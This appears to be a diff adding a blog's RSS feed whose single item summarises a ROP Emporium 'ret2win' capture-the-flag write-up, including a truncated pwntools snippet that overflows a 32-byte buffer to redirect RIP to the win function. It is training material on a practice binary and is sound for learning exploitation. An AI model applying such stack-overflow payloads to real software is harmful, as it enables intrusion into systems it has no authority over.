@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Training on Fang Yuan</title>
+    <link>http://example.org/tags/training/</link>
+    <description>Recent content in Training on Fang Yuan</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>hcdtdayneg@gmail.com (d.thuc)</managingEditor>
+    <webMaster>hcdtdayneg@gmail.com (d.thuc)</webMaster>
+    <copyright>©2024, All Rights Reserved</copyright>
+    <lastBuildDate>Sat, 06 Nov 2021 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="http://example.org/tags/training/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Trainning ROP EMPORIUM</title>
+        <link>http://example.org/posts/rop-emporium/</link>
+        <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
+        <author>hcdtdayneg@gmail.com (d.thuc)</author>
+        <atom:modified>Sat, 06 Nov 2021 00:00:00 +0000</atom:modified>
+        <guid>http://example.org/posts/rop-emporium/</guid>
+        <description>Writeup — ROP Emporium Challenge 01: ret2win Our aim is overflow to control RIP.
+The input buffer is 32 bytes, but the input area allows 56 bytes. This allow overwriting the saved RBP and RIP.
+Exploit: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * p = process(&amp;#34;./ret2win&amp;#34;) elf = ELF(&amp;#34;./ret2win&amp;#34;) payload = &amp;#34;A&amp;#34; * 40 payload += p64(elf.symbols[&amp;#34;ret2win&amp;#34;]) open(&amp;#39;payload&amp;#39;, &amp;#39;w&amp;#39;).</description>
+        
+        <dc:creator>fang yuan</dc:creator>
+        
+        
+        
+        
+          
+            
+              <category>Training</category>
+            
+          
+            
+              <category>pwn</category>
+            
+          
+            
+              <category>rop</category>
+            
+          
+            
+              <category>writeups</category>
+            
+          
+        
+        
+          
+            
+              <category>Writeup</category>
+            
+          
+        
+        
+          
+            
+              <category>trainning</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
